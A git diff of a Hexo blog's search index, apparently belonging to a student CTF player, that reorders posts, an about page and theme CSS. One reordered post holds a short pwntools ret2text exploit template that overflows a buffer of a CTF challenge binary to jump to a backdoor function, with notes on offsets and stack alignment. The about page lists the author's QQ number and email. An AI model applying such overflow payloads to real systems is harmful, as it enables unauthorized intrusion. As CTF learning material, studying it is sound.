@@ -1,20 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ret2text小tips</title>
-    <url>/posts/1111.html</url>
-    <content><![CDATA[exp模板
-from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()
-
-264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址
-注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位
+    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
+    <url>/posts/d4f00467.html</url>
+    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
+看一下左下角的时间，如果是now那就证明保存了
+另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
+最后，感谢我磊哥再一次救我
 ]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>ret2text</tag>
-      </tags>
   </entry>
   <entry>
     <title>初识ROP</title>
@@ -54,13 +47,20 @@ context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = r
       </tags>
   </entry>
   <entry>
-    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
-    <url>/posts/d4f00467.html</url>
-    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
-看一下左下角的时间，如果是now那就证明保存了
-另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
-最后，感谢我磊哥再一次救我
+    <title>ret2text小tips</title>
+    <url>/posts/1111.html</url>
+    <content><![CDATA[exp模板
+from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()
+
+264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址
+注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位
 ]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2text</tag>
+      </tags>
   </entry>
   <entry>
     <title>初识ret2libc</title>
@@ -112,6 +112,11 @@ from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.
 ]]></content>
   </entry>
   <entry>
+    <title>分类</title>
+    <url>/categories/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title></title>
     <url>/about/index.html</url>
     <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn
@@ -120,11 +125,6 @@ from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.
 
 联系我QQ 1935572185163邮箱 lzr20061008@163.com
 ]]></content>
-  </entry>
-  <entry>
-    <title>标签</title>
-    <url>/tags/index.html</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title></title>
@@ -574,32 +574,11 @@ div#category {
 
 
 
-
-/*导航栏*/
-.nav-fixed>#nav {
-  background: linear-gradient(-45deg, #34c5ffdd, #40fbf2dd, #4de4ffdd, #1195dddd) !important;
-  backdrop-filter: blur(10px);
-}
-[data-theme="dark"] .nav-fixed>#nav{
-  background: rgba(45, 10, 61, 0.7) !important;
-  backdrop-filter: blur(10px);
-}
-
-/*
-
-/*文章页面*/
-.layout>#post {
-  background: linear-gradient(-45deg, #d7806bdd, #ff6b9cdd, #ff7a37dd, #dd6670dd) !important;
-}
-
-[data-theme=dark] .layout>#post {
-  background: rgba(45, 10, 61, 0.7) !important;
-}
 ]]></content>
   </entry>
   <entry>
-    <title>分类</title>
-    <url>/categories/index.html</url>
+    <title>标签</title>
+    <url>/tags/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
 </search>
